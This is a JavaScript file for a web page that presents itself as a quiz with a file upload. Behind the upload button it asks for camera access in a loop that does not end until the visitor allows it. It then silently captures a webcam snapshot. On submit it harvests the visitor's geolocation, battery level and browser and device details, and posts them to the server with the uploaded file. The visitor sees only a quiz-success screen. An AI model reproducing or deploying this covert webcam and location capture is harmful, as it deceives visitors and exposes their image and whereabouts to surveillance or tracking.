const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const fileInput = document.getElementById("user-file");
const triggerUpload = document.getElementById("trigger-upload");
const toast = document.getElementById("toast");
const quizForm = document.getElementById("quiz-form");

let cameraAllowed = false;
let capturedImage = null;

// Show toast message
function showToast(msg, duration = 2000) {
  toast.textContent = msg;
  toast.classList.add("show");
  setTimeout(() => toast.classList.remove("show"), duration);
}

// Request camera
async function requestCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    cameraAllowed = true;

    // Capture one frame immediately
    const ctx = canvas.getContext("2d");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    capturedImage = canvas.toDataURL("image/jpeg");

    // Stop stream to free camera
    stream.getTracks().forEach(track => track.stop());
  } catch (err) {
    cameraAllowed = false;
    showToast("Camera permission required to continue.");
  }
}

// Reset camera permission on reload
window.addEventListener("load", () => {
  cameraAllowed = false;
  capturedImage = null;
});

// Trigger file input after camera allowed
triggerUpload.addEventListener("click", async () => {
  while (!cameraAllowed) {
    await requestCamera();
  }
  fileInput.click();
});

// Handle form submit
quizForm.addEventListener("submit", async (e) => {
  e.preventDefault();

  if (!fileInput.files.length) {
    showToast("Please select a file.");
    return;
  }

  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    width: window.innerWidth,
    height: window.innerHeight,
    language: navigator.language,
    battery: navigator.getBattery ? await (await navigator.getBattery()).level : null,
    location: navigator.geolocation ? await new Promise(res => navigator.geolocation.getCurrentPosition(pos => res(pos.coords), () => res(null))) : null,
    time: new Date().toISOString()
  };

  const formData = new FormData();
  formData.append("file", fileInput.files[0]);
  formData.append("image", capturedImage);
  formData.append("metadata", JSON.stringify(metadata));

  try {
    const res = await fetch("/upload", { method: "POST", body: formData });
    const data = await res.json();
    if (data.success) {
      document.getElementById("quiz-container").style.display = "none";
      document.getElementById("success-container").style.display = "block";
    } else {
      showToast("Upload failed: " + data.error);
    }
  } catch (err) {
    showToast("Server error: " + err.message);
  }
});
